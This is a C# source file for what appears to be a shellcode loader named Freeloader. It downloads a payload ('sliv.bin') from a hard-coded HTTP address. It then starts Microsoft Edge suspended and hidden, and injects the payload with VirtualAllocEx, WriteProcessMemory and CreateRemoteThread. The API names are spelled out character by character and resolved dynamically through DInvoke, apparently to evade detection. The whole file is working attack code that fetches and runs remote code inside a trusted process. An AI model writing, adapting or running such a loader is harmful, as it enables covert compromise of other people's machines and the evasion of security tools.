using System;
using System.Runtime.InteropServices;
using static Freeloader.Free32;
using DInvoke.DynamicInvoke;
using System.Diagnostics;
using System.Linq;
using static Freeloader.FreeInvoke;
using System.Threading.Tasks;
using System.Net.Http;

namespace Freeloader
{
    internal class Program
    {
        public static async Task Main(string[] args)
        {
            EnableDebug.EnableDebugPrivileges();
            UInt32 bytesWritten = 0;
            byte[] shellcode;

            char[] kerndll = new[] { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
            string dYuTz = new string(kerndll);
            char[] opt_lib = new[] { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' };
            string lItKe = new string(opt_lib);
            char[] vax_lib = new[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x'};
            string jNeRq = new string(vax_lib);
            char[] wrt_lib = new[] { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y' };
            string vDeTu = new string(wrt_lib);
            char[] crt_lib = new[] { 'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd' };
            string gTnBe = new string(crt_lib);

            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://172.19.188.214:8777");
                shellcode = await client.GetByteArrayAsync("/sliv.bin");
            }

            Console.WriteLine($"Shellcode Length: {shellcode.Length}");

            var startup = new STARTUPINFO { dwFlags = 0x00000001 };
            startup.cb = Marshal.SizeOf(startup);

            var success = Free32.CreateProcessW(
                null,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application",
                ref startup,
                out var processInfo);

            var pointer = Generic.GetLibraryAddress(dYuTz, lItKe);
            var OPS = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
            var procHandle = OPS(
                PROCESS_ACCESS.PROCESS_ALL_ACCESS, 
                false, 
                processInfo.dwProcessId);

            pointer = Generic.GetLibraryAddress(dYuTz, jNeRq);
            var VAX = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAllocEx)) as VirtualAllocEx;
            var mem_allocate = VAX(
                procHandle,
                IntPtr.Zero,
                (UInt32)shellcode.Length,
                ALLOCATION_TYPE.MEM_COMMIT | ALLOCATION_TYPE.MEM_RESERVE,
                PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

            pointer = Generic.GetLibraryAddress(dYuTz, vDeTu);
            var WPM = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
            var written = WPM(
                procHandle, 
                mem_allocate, 
                shellcode, 
                (UInt32)shellcode.Length, 
                ref bytesWritten);

            // CreateRemoteThread
            pointer = Generic.GetLibraryAddress(dYuTz, gTnBe);
            var CRT = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateRemoteThread)) as CreateRemoteThread;
            written = CRT(
                procHandle, 
                IntPtr.Zero, 
                0, 
                mem_allocate, 
                IntPtr.Zero, 
                0, 
                IntPtr.Zero);

            var notepad = Process.GetProcessesByName("notepad").FirstOrDefault();
        }
    }
}
